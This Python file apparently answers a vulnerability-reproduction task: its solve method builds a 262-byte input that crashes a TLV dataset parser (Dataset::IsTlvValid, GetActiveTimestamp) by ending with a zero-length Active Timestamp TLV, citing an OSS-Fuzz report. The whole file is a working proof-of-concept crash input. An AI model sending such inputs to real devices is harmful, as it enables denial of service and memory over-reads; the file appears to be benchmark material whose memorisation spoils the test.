import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers the vulnerability.

        The vulnerability exists in `Dataset::IsTlvValid()`, where the length of
        Active Timestamp TLVs (type 0x0E) is not validated. The correct length
        should be 8 bytes.

        The crash occurs when a consumer of the dataset, such as the `GetActiveTimestamp`
        method, attempts to read 8 bytes for the timestamp's value from a TLV that
        has a smaller, invalid length (e.g., 0). This results in a buffer over-read.

        Based on the OSS-Fuzz crash report (oss-fuzz:385180600), the crash is a
        "READ of size 8" that occurs immediately after a 262-byte buffer. This
        indicates the PoC should be 262 bytes long, with the malformed Active
        Timestamp TLV positioned at the very end. The preceding 260 bytes must
        consist of a validly structured sequence of TLVs to ensure the parser
        reaches the malicious TLV.

        The PoC is constructed as follows:
        1. Padding TLV 1: A 256-byte TLV using a type (0x08, Steering Data) that
           lacks strict length validation in the vulnerable code. This consists of a
           2-byte header (type, length) and a 254-byte value.
        2. Padding TLV 2: A 4-byte TLV of the same type to bring the total
           padding length to 260 bytes. This has a 2-byte header and a 2-byte value.
        3. Trigger TLV: A 2-byte malformed Active Timestamp TLV (type 0x0E, length 0).
           This is placed at offset 260. When `GetActiveTimestamp` is called, it
           will find this TLV and attempt to read 8 bytes from its value, which starts
           at offset 262 (260 + 2), thus reading past the end of the 262-byte buffer.
        """
        
        # Use a TLV type for padding that has no specific length validation.
        # Type 0x08 (Steering Data) is a safe choice.
        padding_type = b'\x08'

        # Padding TLV 1: Total length 256 bytes (2-byte header + 254-byte value).
        # The length field of a TLV is a single byte, so a value > 255 is not possible.
        # To create 260 bytes of valid TLV data, we need at least two TLVs.
        padding1_len = 254
        padding1 = padding_type + padding1_len.to_bytes(1, 'little') + (b'\x00' * padding1_len)

        # Padding TLV 2: Total length 4 bytes (2-byte header + 2-byte value).
        # This brings the total padding size to 256 + 4 = 260 bytes.
        padding2_len = 2
        padding2 = padding_type + padding2_len.to_bytes(1, 'little') + (b'\x00' * padding2_len)

        # Trigger TLV: 2 bytes. Type 0x0E (Active Timestamp) with malformed length 0.
        trigger = b'\x0e\x00'

        poc = padding1 + padding2 + trigger
        
        return poc